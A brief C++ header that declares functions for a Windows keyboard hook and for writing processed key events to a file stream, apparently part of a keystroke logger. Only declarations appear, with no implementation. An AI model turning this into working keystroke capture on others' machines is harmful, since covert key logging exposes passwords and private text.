#pragma once
#include<fstream>

const int bufferSize = 300;
void UpdateKeyState(BYTE *keystate, int keyCode);
LRESULT CALLBACK HoockCallback(int nCode, WPARAM wParam, LPARAM lParam);
void ProcessEvent(char* lpszName, int codeNum, std::string& str, WPARAM wParam,std::ofstream &outputStream);
